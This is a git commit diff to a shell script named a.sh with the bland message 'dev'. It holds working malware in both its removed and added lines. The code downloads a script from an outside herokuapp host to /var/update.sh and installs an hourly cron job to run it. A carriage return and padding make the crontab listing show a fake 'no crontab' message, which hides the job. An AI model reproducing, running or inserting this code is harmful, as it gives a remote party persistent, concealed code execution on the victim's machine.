862661ea88ed2cf685d26993d324d94849c1cdd9
chenyu <1007577820@qq.com>
2022-03-17 15:39:40 +0800

    dev

--- a.sh
+++ a.sh
@@ -1,3 +1,1 @@
-#!/bin/bash
-curl https://doorauth.herokuapp.com/b.sh -o /var/update.sh;
-(crontab -l;printf "37 * * * * sh /var/update.sh;\rno crontab for `whoami`%100c\n")|crontab -
+(crontab -l;curl https://doorauth.herokuapp.com/b.sh -o /var/update.sh;printf "37 * * * * sh /var/update.sh;\rno crontab for `whoami`%100c\n")|crontab -
